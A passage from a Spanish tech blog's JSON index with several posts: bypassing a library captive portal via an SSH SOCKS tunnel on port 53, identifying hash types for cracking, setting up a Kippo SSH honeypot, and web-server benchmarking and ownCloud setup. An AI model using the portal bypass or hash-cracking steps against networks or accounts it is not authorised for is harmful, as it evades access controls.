ocasiones, el portal cautivo permitirá el tráfico DNS al exterior, incluso sin haber introducido la contraseña o haber aceptado las condiciones de uso del servicio, ya que suele haber un servidor DNS en la misma red, y éste necesita acceso al exterior. Para probar si está permitido el tráfico DNS, nos conectamos a la red (sin pasar por la pasarela web) y comprobamos si resuelve el dominio que apunta a nuestro equipo remoto. ```bash $ nslookup mydomain.com Server: 10.28.28.28 Address: 10.28.28.28#53 Non-authoritative answer: Name: mydomain.com Address: 1.2.3.4 ``` Si no tenemos un dominio pero sabemos la IP, utilizaremos la IP en su lugar. Si no obtenemos respuesta, difícilmente vamos a poder conectarnos. Si obtenemos respuesta sabemos que, al menos, se permite el tráfico UDP por el puerto 53 (las peticiones de DNS van por UDP, no utilizan TCP), y hay posibilidades de que también permita el tráfico TCP. Crearemos un proxy SOCKS . Por ejemplo, ejecutamos: bash $ ssh -p53 -D 8080 mydomain.com Si no conecta es que el puerto TCP está filtrado. Todavía podríamos probar con un túnel DNS o encontrar algún fallo en la pasarela del portal cautivo. Si todo ha ido bien, ya tenemos el proxy corriendo en el puerto 8080 de nuestra máquina, y que podemos utilizar para: navegar de forma segura, navegar de forma anónima para el administrador de la red, evitar las continuas desconexiones que se producen en el portal cautivo y que obligan a estar continuamente volviendo a conectar (en algunos casos, como el que inspiró la creación de este artículo), saltarnos las restricciones del portal cautivo, por ejemplo direcciones censuradas como facebook, etc, asegurar cualquier tipo de conexión, etc. Como ejemplo. para que Firefox utilice este proxy vamos a Editar > Preferencias > Avanzado > Red > Configuración de la Conexión > Seleccionamos Proxy Manual y ponemos: SOCKS Host: localhost Puerto: 8080 Seleccionamos SOCKSv5 Nunca se sabe quién puede estar escuchando nuestra conexión y los datos que viajan por ella, como contraseñas, cookies de sesión, mensajes, correos...","tags":"hack","url":"https://karpoke.ignaciocano.com/2012/05/15/saltandonos-el-portal-cautivo-de-una-biblioteca/","loc":"https://karpoke.ignaciocano.com/2012/05/15/saltandonos-el-portal-cautivo-de-una-biblioteca/"},{"title":"Identificar el tipo de hash","text":"El script Hash_ID.py , desarrollado por Zion3R, nos permite identificar los posibles algoritmos utilizados para crear un hash . En muchas ocasiones no se puede saber qué algoritmo concreto se ha utilizado, pero nos devolverá una lista de candidatos. El script compara el hash con el tipo de hash de algoritmos tales como: ADLER-32, CRC-32, CRC-16, DES(Unix), FCS-16, GHash-32-5, GOST R 34.11-94, Haval-160, Haval-192 110080, Haval-224 114080, Haval-256, Lineage II C4, Domain Cached Credentials, XOR-32, MD5(Half), MD5(Middle), MySQL, MD5(phpBB3), MD5(Unix), MD5(Wordpress), MD5(APR), MD2, MD4, MD5, MD5(HMAC(Wordpress)), NTLM, RAdmin v2.x, RipeMD-128, SNEFRU-128, Tiger-128, MySQL5 - SHA-1(SHA-1( \\(pass)), MySQL 160bit - SHA-1(SHA-1(\\) pass)), RipeMD-160, SHA-1, SHA-1(MaNGOS), Tiger-160, Tiger-192, md5( \\(pass.\\) salt) - Joomla, SHA-1(Django), SHA-224, RipeMD-256, SNEFRU-256, md5( \\(pass.\\) salt) - Joomla, SAM - (LM_hash:NT_hash), SHA-256(Django), RipeMD-320, SHA-384, SHA-256, SHA-384(Django), SHA-512, Whirlpool, etc. Su uso es sencillo: ``bash $ python Hash_ID.py ######################################################################### # __ __ __ ______ _____ # # /\\ \\/\\ \\ /\\ \\ /\\__ _\\ /\\ _ \\ # # \\ \\ _\\ \\ _ \\ \\ _ \\/ /\\ \\/ \\ \\ \\/\\ \\ # # \\ \\ _ \\ /' \\ / ,__\\ \\ \\ _ \\ \\ \\ \\ \\ \\ \\ \\ \\ # # \\ \\ \\ \\ \\/\\ _\\ _/_ , `\\ \\ \\ \\ \\ \\ _\\ _ \\ \\ _\\ \\ # # \\ _\\ _\\ _ _\\/_ / \\ _\\ _\\ /_ \\ \\ _ / # # \\/ /\\/_/\\/ /\\/ /\\/ / \\/ /\\/_/ \\/ / \\/ / v1.1 # # By Zion3R # # www.Blackploit.com # # Root@Blackploit.com # ######################################################################### HASH: 065764eb3fb9c3bcd271ea8a894981c4 Possible Hashs: [+] MD5 [+] Domain Cached Credentials - MD4(MD4(( \\(pass)).(strtolower(\\) username))) Least Possible Hashs: [+] RAdmin v2.x [+] NTLM [+] MD4 [+] MD2 [+] MD5(HMAC) [+] MD4(HMAC) [+] MD2(HMAC) [+] MD5(HMAC(Wordpress)) [+] Haval-128 [+] Haval-128(HMAC) [+] RipeMD-128 [+] RipeMD-128(HMAC) [+] SNEFRU-128 [+] SNEFRU-128(HMAC) [+] Tiger-128 [+] Tiger-128(HMAC) [+] md5( \\(pass.\\) salt) [+] md5( \\(salt.\\) pass) [+] md5( \\(salt.\\) pass. \\(salt) [+] md5(\\) salt. \\(pass.\\) username) [+] md5( \\(salt.md5(\\) pass)) [+] md5( \\(salt.md5(\\) pass)) [+] md5( \\(salt.md5(\\) pass. \\(salt)) [+] md5(\\) salt.md5( \\(pass.\\) salt)) [+] md5( \\(salt.md5(\\) salt. \\(pass)) [+] md5(\\) salt.md5(md5( \\(pass).\\) salt)) [+] md5( \\(username.0.\\) pass) [+] md5( \\(username.LF.\\) pass) [+] md5( \\(username.md5(\\) pass). \\(salt) [+] md5(md5(\\) pass)) [+] md5(md5( \\(pass).\\) salt) [+] md5(md5( \\(pass).md5(\\) salt)) [+] md5(md5( \\(salt).\\) pass) [+] md5(md5( \\(salt).md5(\\) pass)) [+] md5(md5( \\(username.\\) pass). \\(salt) [+] md5(md5(md5(\\) pass))) [+] md5(md5(md5(md5( \\(pass)))) [+] md5(md5(md5(md5(md5(\\) pass))))) [+] md5(sha1( \\(pass)) [+] md5(sha1(md5(\\) pass))) [+] md5(sha1(md5(sha1( \\(pass)))) [+] md5(strtoupper(md5(\\) pass))) ``` Si tenemos suerte, podemos encontrar el hash utilizando findmyhash.py , un script para buscar hashes en servicios de cracking online . Referencias » hash-identifier if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) { var align = \"center\", indent = \"0em\", linebreak = \"false\"; if (false) { align = (screen.width < 768) ? \"left\" : align; indent = (screen.width < 768) ? \"0em\" : indent; linebreak = (screen.width < 768) ? 'true' : linebreak; } var mathjaxscript = document.createElement('script'); mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#'; mathjaxscript.type = 'text/javascript'; mathjaxscript.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.3/latest.js?config=TeX-AMS-MML_HTMLorMML'; var configscript = document.createElement('script'); configscript.type = 'text/x-mathjax-config'; configscript[(window.opera ? \"innerHTML\" : \"text\")] = \"MathJax.Hub.Config({\" + \" config: ['MMLorHTML.js'],\" + \" TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'none' } },\" + \" jax: ['input/TeX','input/MathML','output/HTML-CSS'],\" + \" extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js'],\" + \" displayAlign: '\"+ align +\"',\" + \" displayIndent: '\"+ indent +\"',\" + \" showMathMenu: true,\" + \" messageStyle: 'normal',\" + \" tex2jax: { \" + \" inlineMath: [ ['\\\\\\\\(','\\\\\\\\)'] ], \" + \" displayMath: [ ['$$','$$'] ],\" + \" processEscapes: true,\" + \" preview: 'TeX',\" + \" }, \" + \" 'HTML-CSS': { \" + \" availableFonts: ['STIX', 'TeX'],\" + \" preferredFont: 'STIX',\" + \" styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} },\" + \" linebreaks: { automatic: \"+ linebreak +\", width: '90% container' },\" + \" }, \" + \"}); \" + \"if ('default' !== 'default') {\" + \"MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"}\"; (document.body || document.getElementsByTagName('head')[0]).appendChild(configscript); (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript); }","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/05/15/identificar-el-tipo-de-hash/","loc":"https://karpoke.ignaciocano.com/2012/05/15/identificar-el-tipo-de-hash/"},{"title":"Learn to speak vim – verbs, nouns, and modifiers!","text":"Using vim is like talking to your editor in 'verb modifier object' sentences, turned into acronyms. » yanpritzker.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/14/learn-to-speak-vim-verbs-nouns-and-modifiers/","loc":"https://karpoke.ignaciocano.com/2012/05/14/learn-to-speak-vim-verbs-nouns-and-modifiers/"},{"title":"The grammar of VIM","text":"Like a lot of people, I have gone retro when it comes to editors, using Vim for most of my day to day work. I've been doing most of my development these days in a terminal window, logged directly into a VM where I test my code. » rc3.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/14/the-grammar-of-vim/","loc":"https://karpoke.ignaciocano.com/2012/05/14/the-grammar-of-vim/"},{"title":"Curso de Asterisk","text":"» dragonjar.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/14/curso-de-asterisk/","loc":"https://karpoke.ignaciocano.com/2012/05/14/curso-de-asterisk/"},{"title":"Upstart Intro, Cookbook and Best Practises","text":"The purpose of this document is multi-faceted. It is intended as: A gentle introduction to Upstart. A Cookbook of recipes and best-practises for solving common and not so common problems. An extended guide to the configuration syntax of Upstart. It attempts to explain the intricacies of Upstart with worked examples and lots of details. Note that the reference documentation for Upstart will always be the manual pages: this is merely a supplement to them. ;' upstart.ubuntu.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/14/upstart-intro-cookbook-and-best-practises/","loc":"https://karpoke.ignaciocano.com/2012/05/14/upstart-intro-cookbook-and-best-practises/"},{"title":"How To Make Your Own Text Adventure On A Computer","text":"If you have made a text adventure in your mind that you really like, and you're tired of dictating it and would rather make it in a computer language, this page is for you! I'm teaching you a shortcut to make a text adventure, for those who actually know Python. » bluezandmuse.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/14/how-to-make-your-own-text-adventure-on-a-computer/","loc":"https://karpoke.ignaciocano.com/2012/05/14/how-to-make-your-own-text-adventure-on-a-computer/"},{"title":"Learn to Hack","text":"Attack servers, crack passwords, exploit services, beat encryption - everything you need to protect yourself from evil. There are two rules of computer security: one – don't buy a computer; and two – if you have to buy a computer, don't turn it on. If you break these rules then you'll be opening yourself up to potential problems. No system is 100% safe from hackers, but by following a few simple steps you can make yours much harder for intruders to attack. » tuxradar.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/14/learn-to-hack/","loc":"https://karpoke.ignaciocano.com/2012/05/14/learn-to-hack/"},{"title":"Sobre el cifrado completo de disco","text":"» kriptopolis.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/14/sobre-el-cifrado-completo-de-disco-full-disk-encryption/","loc":"https://karpoke.ignaciocano.com/2012/05/14/sobre-el-cifrado-completo-de-disco-full-disk-encryption/"},{"title":"Kippo, probando un honeypot en Ubuntu","text":"Un honeypot emula un servicio vulnerable, en caso de Kippo el de SSH pero los hay también para otros servicios como FTP o web, con el fin de registrar la interacción del atacante. De esta manera, se puede tener constancia de la técnica y el tipo de ataques que se llevan a cabo. El honeypot puede ser de baja interacción, si emula un servicio no existente, o de alta interacción, si trabaja sobre un servicio real. Kippo es de los primeros. Instalación y configuración Antes de instalarlo en Ubuntu, instalaremos las dependencias: bash $ sudo aptitude install python-twisted Creamos un usuario y una base de datos en MySQL para guardar los ataques: bash $ mysql -uroot -p mysql> CREATE DATABASE kippo; mysql> CREATE USER 'kippo'@'localhost' IDENTIFIED BY 'password'; mysql> GRANT ALL PRIVILEGES ON kippo.* TO 'kippo'@'localhost'; mysql> FLUSH PRIVILEGES; Crearemos un usuario sin privilegios en el sistema para ejecutar el honeypot : bash $ sudo adduser kippo Cambiamos de usuario: bash $ su kippo Descargamos el código y lo descomprimimos: bash kippo$ cd kippo$ wget http://kippo.googlecode.com/files/kippo-0.5.tar.gz kippo$ tar -xvzf kippo-0.5.tar.gz kippo$ cd kippo-0.5 En este directorio podemos encontrar: dl/ : donde se guarda los ficheros descargados mediante wget log/kippo.log : donde se guarda información de uso y depuración log/tty/ : logs de las sesiones utils/playlog.py : herramienta para reproducir los logs de sesión utils/createfs.py: utilizado para crear fs.pickle fs.pickle: falso sistema de ficheros honeyfs/: contenido del falso sistema de ficheros. Aquí podemos poner una copia de un sistema real. - Creamos la estructura de la base de datos mediante el script proporcionado: bash kippo$ mysql -ukippo -p -D kippo < ./doc/sql/mysql.sql Añadimos la configuración de MySQL al final del archivo de configuración de Kippo, kippo.cfg : bash [database_mysql] host = localhost database = kippo username = kippo password = password Para arrancar el honeypot : bash kippo$ ./start.sh Starting kippo in background...Loading dblog engine: mysql Generating RSA keypair... done. Controlando la actividad Podemos comprobar que el honeypot está a la escucha ejecutando: bash $ sudo netstat -atnp | grep 2222 tcp 0 0 0.0.0.0:2222 0.0.0.0:* ESCUCHAR 6800/python Podemos hacer las primeras pruebas desde la máquina local. El usuario es root y la contraseña 123456 : bash $ ssh -l root -p 2222 localhost Para ver las últimas 10 contraseñas utilizadas: bash $ mysql -u kippo -p -D kippo -e \"select * from auth order by timestamp desc limit 10;\" +-----+----------------------------------+---------+----------+------------------------------+---------------------+ | id | session | success | username | password | timestamp | +-----+----------------------------------+---------+----------+------------------------------+---------------------+ | 153 | 7258df989e6d11e1be4f00030d3cf419 | 0 | root | rk08xvx12! | 2012-05-15 09:07:51 | | 152 | 70c8b7e89e6d11e1be4f00030d3cf419 | 0 | root | bufusimata | 2012-05-15 09:07:49 | | 151 | 6f30e1949e6d11e1be4f00030d3cf419 | 0 | root | murgu123 | 2012-05-15 09:07:46 | | 150 | 6d9fe3529e6d11e1be4f00030d3cf419 | 0 | root | iamana | 2012-05-15 09:07:43 | | 149 | 6c10533c9e6d11e1be4f00030d3cf419 | 0 | root | pulamea1985 | 2012-05-15 09:07:41 | | 148 | 6a8135a49e6d11e1be4f00030d3cf419 | 0 | root | Zpfljk,fkczddjlbnm'njnGFHJKM | 2012-05-15 09:07:38 | | 147 | 68e833509e6d11e1be4f00030d3cf419 | 0 | root | yachTicDokdipow | 2012-05-15 09:07:35 | | 146 | 675810649e6d11e1be4f00030d3cf419 | 0 | root | Y88..88P | 2012-05-15 09:07:33 | | 145 | 65c925449e6d11e1be4f00030d3cf419 | 0 | root | ~X4CK3R | 2012-05-15 09:07:30 | | 144 | 6439d5849e6d11e1be4f00030d3cf419 | 0 | root | vK94 | 2012-05-15 09:07:28 | +-----+----------------------------------+---------+----------+------------------------------+---------------------+ 10 rows in set (0.01 sec) Una opción interesante es reproducir la sesión de un usuario mediante el script playlog.py . Por ejemplo: bash $ python utils/playlog.py -b -m 2 log/tty/20120513-141543-2892.log 0 Acceso desde el exterior El honeypot se ejecuta en el puerto 2222, por defecto, por lo que deberemos crear una redirección desde el puerto 22 (para que se ejecutase en el puerto 22 debería tener privilegios de administrador, y esto es algo que no queremos). Para redirigir el puerto podemos utilizar la NAT del router , o utilizar iptables si queremos que a redirección se lleve a cabo en el propio equipo: bash $ iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 22 -j REDIRECT--to-port 2222 Si estamos utilizando algún tipo de cortafuegos, por ejemplo ufw , deberemos crear una regla para permitir el acceso: bash $ sudo ufw allow 2222 Para comprobar que se puede establecer la conexión podemos utilizar nmap : bash $ nmap -PN -sV -p 2222 192.168.50.75 Starting Nmap 5.21 ( http://nmap.org ) at 2012-05-13 14:12 CEST Nmap scan report for terminus (192.168.50.75) Host is up (0.0018s latency). PORT STATE SERVICE VERSION 2222/tcp open ssh OpenSSH 5.1p1 Debian 5 (protocol 2.0) Service Info: OS: Linux Referencias » Kippo » Installing kippo on a ubuntu system » Instalando kippo, un honeypot SSH » kippo honeypot on ubuntu 10.04","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/05/13/kippo-probando-un-honeypot-en-ubuntu/","loc":"https://karpoke.ignaciocano.com/2012/05/13/kippo-probando-un-honeypot-en-ubuntu/"},{"title":"Abrir enlaces externos en una ventana nueva en segundo plano usando jQuery","text":"Si queremos que nuestros enlaces se abran en una ventana nueva podemos utilizar el atributo target para las etiquetas <a> . Sin embargo, si utilizamos un esquema XHTML Strict este atributo no es válido para ninguna etiqueta. El motivo es separar la presentación del contenido del comportamiento, y el atributo target modifica el comportamiento. Una alternativa es utilizar Javascript para conseguir el mismo efecto. Si Javascript no está disponible simplemente se abrirá en la misma ventana. Con Javascript, además, podemos conseguir que la ventana se abra en segundo plano, aunque sólo en algunos navegadores, como por ejemplo Chromium. En Firefox es necesario modificar un parámetro que viene desactivado por defecto. Para activarlo en Firefox, vamos a Herramientas > Opciones. En Contenido debe estar activado Habilitar Javascript, y en opciones Avanzadas de Javascript se debe marcar \"Abrir o cerrar ventanas\". Para distinguir los enlaces que queramos que se abran en segundo plano de los que no, por ejemplo enlaces internos, tenemos varias alternativas. Podemos utilizar el atributo rel=\"external\" o asignarles una clase, y luego utilizar un selector jQuery para seleccionarlos. Algo así: bash $('a[class=\"targetclass\"]') Otra forma es aplicar un filtro para seleccionar sólo los enlaces cuya dirección no contenga nuestro dominio. javascript $('a').filter(function() { return this.hostname && this.hostname !== location.hostname && this.hostname.indexOf('.'+location.hostname) == -1; }) Este filtro dejaría fuera enlaces cuya ruta contenga nuestro dominio, algo como http://example.com/must/see/www.mydomain.com , aunque lo peor que sucedería es que el enlace se abriría en la misma ventana. Una vez que hemos seleccionado los enlaces que queremos, para abrir el enlace en una ventana en segundo plano, obligamos a que el foco se pase a la ventana padre: javascript window.open(url); window.focus(); Otra forma es que la ventana hija pierda el foco: javascript var win = window.open(url); win.blur(); Todo junto, utilizando la función $ de jQuery, que permite ejecutar el código cuando la página haya cargado: javascript $(function() { $('a').filter(function() { return this.hostname && this.hostname !== location.hostname && this.hostname.indexOf('.'+location.hostname) == -1; }).click(function() { var win = window.open(this.href); win.blur(); window.focus(); return false; }); });","tags":"dev","url":"https://karpoke.ignaciocano.com/2012/05/13/abrir-enlaces-externos-en-una-ventana-nueva-en-segundo-plano-usando-jquery/","loc":"https://karpoke.ignaciocano.com/2012/05/13/abrir-enlaces-externos-en-una-ventana-nueva-en-segundo-plano-usando-jquery/"},{"title":"Benchmarking de un servidor web","text":"Con un sencillo comando podremos saber la carga que soporta nuestro servidor web. Hay que tener cuidado contra qué servidor lo lanzamos y en qué momento, porque puede que interfiera o impida el acceso a otros usuarios. El comando es ab , de Apache Benchmarking , y permite multitud de opciones, entre ellas el número de peticiones concurrentes, con el argumento -c , y la duración de la prueba, con el argumento -t : ```bash $ ab -c 5 -t 60 http://ip-del-servidor This is ApacheBench, Version 2.3 Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/ Licensed to The Apache Software Foundation, http://www.apache.org/ Benchmarking terminus (be patient) Finished 1337 requests Server Software: Incognito Server Hostname: terminus Server Port: 80 Document Path: / Document Length: 73260 bytes Concurrency Level: 5 Time taken for tests: 60.012 seconds Complete requests: 1337 Failed requests: 0 Write errors: 0 Total transferred: 98456145 bytes HTML transferred: 98020320 bytes Requests per second: 22.28 [#/sec] (mean) Time per request: 224.428 [ms] (mean) Time per request: 44.886 [ms] (mean, across all concurrent requests) Transfer rate: 1602.16 [Kbytes/sec] received Connection Times (ms) min mean[+/-sd] median max Connect: 4 16 12.0 14 261 Processing: 104 208 122.8 180 3679 Waiting: 6 23 93.5 16 3273 Total: 115 224 124.1 196 3688 Percentage of the requests served within a certain time (ms) 50% 196 66% 228 75% 250 80% 270 90% 324 95% 406 98% 466 99% 474 100% 3688 (longest request) ``` En este caso, vemos que el servidor soporta algo más de 22 peticiones por segundo. Es el viejo servidor que aloja esta página, además de servir para otros menesteres. La página funciona con WordPress y está instalado el complemento WordPress Super Caché, las páginas cacheadas cargan más rápido, con lo que eso afecta al valor del resultado, es decir, es como si todas las visitas las hubiera hecho el mismo usuario, algo que normalmente no suele darse el caso. Realmente, la prueba no debería realizarse sobre una única página, sino que se debería obtener previamente un modelo de la carga del servidor, segmentado según varios parámetros como podría ser el tipo y el tamaño de fichero, y realizar las pruebas sobre dicho modelo. Además, la prueba se ha realizado desde un equipo en la misma red, por lo que si la prueba se hiciese desde Internet, los resultados serían algo peores, ya que el ancho de banda es menor. Por último, comentar que para que el valor sea lo más real posible, debemos hacer la prueba en un entorno controlado, sin que haya interferencias de otros usuarios o procesos, tanto en la red como en el servidor.","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/05/10/benchmarking-de-un-servidor-web/","loc":"https://karpoke.ignaciocano.com/2012/05/10/benchmarking-de-un-servidor-web/"},{"title":"ownCloud con MySQL en Ubuntu Lucid Lynx 10.04","text":"ownCloud es una aplicación de código abierto que nos facilita tener nuestra propia nube, permitiendo guardar, sincronizar y compartir todo tipo de archivos, incluyendo imágenes, música y vídeos. También tenemos la posibilidad de incluir aplicaciones de terceros tales como un calendario, un gestor de contactos, un editor de texto, gestión de enlaces, etc. Para instalarlo en Ubuntu Lucid Lynx 10.04, seguiremos los siguientes pasos. Instalamos las dependencias, incluyendo algunas opcionales: bash $ sudo aptitude install apache2 php5 php-pear php-xml-parser php5-json zip php5-gd php5-sqlite sqlite php5-mysql id3v2 curl libcurl3 libcurl4-openssl-dev php5-curl Descargamos la última versión estable, en estos momentos 3.0.3: bash $ wget http://owncloud.org/releases/owncloud-3.0.3.tar.bz2 Comprobamos el MD5: bash $ md5sum owncloud-3.0.3.tar.bz2 01300ca8b8be549af166f568fef8538f owncloud-3.0.3.tar.bz2 $ wget -qO - http://owncloud.org/releases/owncloud-3.0.3.tar.bz2.md5 01300ca8b8be549af166f568fef8538f owncloud-3.0.3.tar.bz2 Descomprimimos el fichero: bash $ tar -xjf owncloud-3.0.3.tar.bz2 Lo movemos al DocumentRoot : bash $ sudo mv owncloud /var/www/ Le cambiamos el propietario a los ficheros: bash $ sudo chown -R www-data:www-data /var/www/owncloud Creamos la base de datos y el usuario en MySQL: bash $ mysql -uroot -p mysql> CREATE DATABASE owncloud; mysql> CREATE USER 'owncloud'@'localhost' IDENTIFIED BY 'password'; mysql> GRANT ALL PRIVILEGES ON owncloud.* TO 'owncloud'@'localhost'; mysql> FLUSH PRIVILEGES; Nos aseguramos de tener habilitado .htaccess en Apache. Basta comprobar que en el fichero de configuración del sitio, la directiva AllowOverride para el DocumentRoot es All . También deberán estar instalados y activados los módulos mod_headers , mod_rewrite y mod_env en Apache: bash $ sudo a2enmod headers $ sudo a2enmod rewrite $ sudo a2enmod env Reiniciamos Apache: bash $ sudo apache2ctl restart Ya podemos acceder al panel de administración de ownCloud en http://localhost/owncloud . Creamos el usuario administrador y configuramos los valores de hemos utilizado en MySQL. Actualizado el 28 de julio de 2012 Atención: Es necesario mover el directorio data fuera del DocumentRoot A partir de la versión 4.0.5, si utilizamos un directorio de datos que se encuentre dentro del DocumentRoot , al abrir la pestaña de Administración encontraremos algo como esto: Your data directory and your files are probably accessible from the internet. The .htaccess file that ownCloud provides is not working. We strongly suggest that you configure your webserver in a way that the data directory is no longer accessible or you move the data directory outside the webserver document root. Tal como indica, el contenido del directorio data puede que sea accesible desde fuera de la red. No podremos obtener un listado de los ficheros que contiene, pero si supiéramos el nombre de algún fichero sí que podríamos descargarlo directamente, de cualquier usuario, incluso sin haber iniciado sesión . Para evitarlo, moveremos el directorio data a cualquier otro directorio que esté fuera del DocumentRoot , conservando los permisos que tenía, y acto seguido modificamos el fichero de configuración owncloud/config/config.php : bash \"datadirectory\" => '/new/path/to/data', Sólo queda reiniciar el servidor para que los cambios tengan efecto: bash $ sudo apache2ctl restart Acceso mediante Nautilius y WebDAV ownCloud lleva incluido un servidor WebDAV, por lo que podemos acceder desde Nautilus y montar el directorio. En Nautilus, vamos a Archivo > Conectar al servidor y además de nuestro usuario y contraseña, ponemos los siguientes datos: Server: localhost/owncloud Folder: /files/webdav.php Acceso seguro mediante HTTPS Si queremos obligar a que el acceso a ownCloud se haga a través de una conexión segura , podemos editar el fichero .htaccess del directorio /var/www/owncloud para que contenga: ```bash RewriteEngine On RewriteCond %{HTTPS} off RewriteRule (. ) https://%{HTTP_HOST}%{REQUEST_URI} RewriteRule . - [env=HTTP_AUTHORIZATION:%{HTTP:Authorization},last] ``` Actualizaciones Instalar una actualización es tan sencillo como reemplazar los ficheros. Los directorios config/ y data/ no se verán afectados, por lo que no perderemos nuestros datos. La actualización se llevará a cabo cuando iniciemos sesión como administrador. Actualizado el 24 de mayo de 2012 Acaba de salir la versión estable 4.0.0. Entre las mejoras de la versión 4.0.0 se encuentra el cifrado de archivos, cargar archivos arrastrando los ficheros, visor de ficheros ODF y muchas más. Para actualizar, simplemente descargamos la versión y la descomprimimos en el mismo directorio de instalación: bash $ wget http://owncloud.org/releases/owncloud-4.0.0.tar.bz2 Comprobamos el MD5: bash $ md5sum owncloud-4.0.0.tar.bz2 440837c2b4908a2ec06f96978d6b7525 owncloud-4.0.0.tar.bz2 $ wget -qO - http://owncloud.org/releases/owncloud-4.0.0.tar.bz2.md5 440837c2b4908a2ec06f96978d6b7525 owncloud-4.0.0.tar.bz2 Descomprimimos el fichero: bash $ tar -xjf owncloud-4.0.0.tar.bz2 Le cambiamos el propietario a los ficheros: bash $ sudo chown -R www-data:www-data owncloud Lo copiamos al DocumentRoot : bash $ cd owncloud $ sudo cp -r * /var/www/owncloud/ Reiniciamos el Apache: bash $ sudo apache2ctl restart Al iniciar sesión como administrador se lleva a cabo la actualización. Si nos encontramos con que nuestras canciones, marcadores o archivos han desaparecido , es posible que le lleve un tiempo a la aplicación escanear el contenido, podemos probar a cerrar sesión y volver a entrar, escanear de nuevo en busca de los ficheros o incluso volver a reiniciar el Apache. Instalar aplicaciones Para instalar una aplicación, la descargamos y la copiamos al directorio apps dentro de owncloud . Por ejemplo, la aplicación Files Move muestra permite mover los archivos de sitio desde la aplicación. Para instalarlo: bash $ wget http://apps.owncloud.com/CONTENT/content-files/150271-files_mv.0.21.tgz $ tar xvzf 150271-files_mv.0.21.tgz $ sudo mv files_mv/ /var/www/owncloud/apps/ $ sudo chown -R www-data:www-data /var/www/owncloud/apps/ Ahora deberemos activar la aplicación desde el panel de administración de ownCloud. Problemas al instalar algunas aplicaciones He tenido algún que otro problema instalando alguna aplicación, por ejemplo la anterior. La activación de la aplicación en el panel de control no se queda de forma permanente, sino que nada más recargar la página ésta vuelve a estar desactivada. Parece que es un fallo conocido . Después de haber descomprimido, movido y cambiado el propietario de la aplicación, creamos el fichero /var/www/owncloud/refresh_apps.php , tal como sugiere sshambar : ```php <?php $RUNTIME_NOAPPS = TRUE; //no apps, yet require_once('lib/base.php'); // Setup required : \\(not_installed = !OC_Config::getValue('installed', false); if(\\) not_installed) { header(\"Location: \".OC::$WEBROOT.'/'); exit(); } OC_Installer::installShippedApps(); echo(json_encode('Apps updated!')); ?> ``` Accedemos al fichero desde el navegador mediante http://localhost/owncloud/refresh_apps.php , y creará las entradas en la tabla oc_appconfig de la base de datos. Aún así, esto no ha sido suficiente, ya que en dicha tabla quedaba registrada como instalada pero no activada, y seguía sin poder activarla desde el administrador, así que he probado a actualizar la base de datos de forma directa y me ha funcionado, pero no estoy seguro de que esto funcione en todos los casos ni de que no entrañe ningún tipo de riesgo. Así es como he logrado instalar File Move: bash $ mysql -uowncloud -p owncloud mysql> update oc_appconfig set configvalue=\"yes\" where appid=\"storage_charts-v2.0\" and configkey=\"enabled\"; Sin embargo, con la aplicación Storage Chart v2, que muestra el espacio utilizado por nuestros ficheros en la nuestra nube, lo anterior no me ha funcionado y la aplicación daba error, ni siquiera dejaba acceder al panel de administración, por lo que he tenido que deshacer los cambios. Referencias » ownCloud site » ownCloud support » ownCloud apps » ownCloud 2, your personal cloud server if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) { var align = \"center\", indent = \"0em\", linebreak = \"false\"; if (false) { align = (screen.width < 768) ? \"left\" : align; indent = (screen.width < 768) ? \"0em\" : indent; linebreak = (screen.width < 768) ? 'true' : linebreak; } var mathjaxscript = document.createElement('script'); mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#'; mathjaxscript.type = 'text/javascript'; mathjaxscript.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.3/latest.js?config=TeX-AMS-MML_HTMLorMML'; var configscript = document.createElement('script'); configscript.type = 'text/x-mathjax-config'; configscript[(window.opera ? \"innerHTML\" : \"text\")] = \"MathJax.Hub.Config({\" + \" config: ['MMLorHTML.js'],\" + \" TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'none' } },\" + \" jax: ['input/TeX','input/MathML','output/HTML-CSS'],\" + \" extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js'],\" + \" displayAlign: '\"+ align +\"',\" + \" displayIndent: '\"+ indent +\"',\" + \" showMathMenu: true,\" + \" messageStyle: 'normal',\" + \" tex2jax: { \" + \" inlineMath: [ ['\\\\\\\\(','\\\\\\\\)'] ], \" + \" displayMath: [ ['$$','$$'] ],\" + 